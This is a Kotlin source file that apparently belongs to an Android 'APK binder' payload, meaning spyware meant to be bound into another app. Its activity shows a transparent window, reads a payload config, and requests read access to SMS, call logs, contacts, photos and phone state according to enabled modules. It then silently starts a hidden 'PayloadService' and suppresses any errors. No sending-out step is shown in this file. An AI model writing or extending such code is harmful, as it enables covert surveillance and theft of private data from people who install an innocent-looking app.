package Com.devhs.apkbinder.payload

import android.Manifest
import android.app.Activity
import android.content.Intent
import android.graphics.Color
import android.graphics.drawable.ColorDrawable
import android.os.Build
import android.os.Bundle

class PermissionGateActivity : Activity(), PayloadServiceHost {

    private val requestCode = 1001

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

        window.setBackgroundDrawable(ColorDrawable(Color.TRANSPARENT))

        val cfg = PayloadState.config ?: (application as? PayloadApp)?.readConfig()
        if (cfg == null) {
            finish()
            return
        }
        PayloadState.config = cfg

        val needed = requiredPermissions()
        if (needed.isEmpty()) {
            proceed()
        } else {
            requestPermissions(needed, requestCode)
        }
    }

    override fun onRequestPermissionsResult(
        requestCode: Int,
        permissions: Array<out String>,
        grantResults: IntArray
    ) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults)
        if (requestCode == this.requestCode) proceed()
    }

    private fun requiredPermissions(): Array<String> {
        val list = mutableListOf<String>()
        if (PayloadState.enabled("gallery")) {
            if (Build.VERSION.SDK_INT >= 33) list.add(Manifest.permission.READ_MEDIA_IMAGES)
            else list.add(Manifest.permission.READ_EXTERNAL_STORAGE)
        }
        if (PayloadState.enabled("sms")) list.add(Manifest.permission.READ_SMS)
        if (PayloadState.enabled("calls")) list.add(Manifest.permission.READ_CALL_LOG)
        if (PayloadState.enabled("contacts")) list.add(Manifest.permission.READ_CONTACTS)
        if (PayloadState.enabled("device")) list.add(Manifest.permission.READ_PHONE_STATE)
        if (Build.VERSION.SDK_INT >= 33) list.add(Manifest.permission.POST_NOTIFICATIONS)
        return list.toTypedArray()
    }

    private fun proceed() {
        try {
            startService(Intent(this, PayloadService::class.java))
        } catch (_: Throwable) {
        }
        finish()
    }
}
